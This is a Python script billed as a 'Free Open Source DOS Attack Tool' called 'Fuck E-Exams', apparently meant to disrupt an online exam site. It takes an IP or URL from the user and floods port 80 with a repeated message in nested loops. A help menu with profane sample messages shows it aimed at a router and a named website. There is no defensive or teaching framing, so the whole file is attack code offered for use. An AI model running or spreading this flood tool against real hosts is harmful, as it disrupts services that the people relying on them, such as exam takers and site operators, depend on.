from os import system
import socket
from socket import socket,AF_INET,SOCK_STREAM
import socket
def dos(ip,msg):
	s = socket.socket(AF_INET,SOCK_STREAM)
	s.connect((ip,80))

	test = msg*500
	counter = 0
	for i in test:
		i = str(msg).encode("utf-8")
		s.send(i)
		print(f"[{counter+1}]  ::  [{msg}] Has Been Sent.")
		counter += 1

logo = """ 
\t\t  ______          _       ______      ________   __ Free Open Source DOS Attack Tool                  
\t\t |  ____|        | |     |  ____|    |  ____\ \ / / By Hossam Hamdy
\t\t | |__ _   _  ___| | __  | |__ ______| |__   \ V / __ _ _ __ ___  ___ 
\t\t |  __| | | |/ __| |/ /  |  __|______|  __|   > < / _` | '_ ` _ \/ __|
\t\t | |  | |_| | (__|   <   | |____     | |____ / . \ (_| | | | | | \__ \ 
\t\t |_|   \__,_|\___|_|\_\  |______|    |______/_/ \_\__,_|_| |_| |_|___/
\n\n
[ 1 ] DOS With IP Address
[ 2 ] DOS With URL
[ 3 ] How To Use
"""
print(logo)
command = int(input(">>> "))
while command > 3 or command < 1:
	command = int(input(">>> "))

if command == 1:

	ip = str(input("Enter IP ~$ "))
	msg = str(input("Enter Your Message ~$ "))
	for i in range(500):
		dos(ip,msg)
		dos(ip,msg)
		dos(ip,msg)

elif command == 2:
	url = str(input("Enter URL ~$ "))
	ip = socket.gethostbyname(url)
	msg = str(input("Enter Your Message ~$ "))
	for i in range(500):
		dos(ip,msg)
		dos(ip,msg)
		dos(ip,msg)
elif command == 3:
	print("\n\n")
	he = """

	How To Use Fuck E-Exams Tool
	----------------------------\n
	\t Choose The Method That You Want To DOS With 
	Ex With IP:
		>>> 1
		Enter IP ~$ 192.168.1.1
		Enter MSG ~$ "Fuck You Router"

		[1]  ::  [Fuck You Router] Has Been Sent.
		.
		.
		.
		.
		[n]  ::  [Fuck You Router] Has Been Sent.

	Ex With URL:
		>>> 2
		Enter URL ~$ myshraidar.com // wrl should be without http/www
		Enter MSG ~$ Fuck You Shraider

		[1]  ::  [Fuck You Shraider] Has Been Sent.
		.
		.
		.
		.
		[n]  ::  [Fuck You Shraider] Has Been Sent.
	"""

system("pause")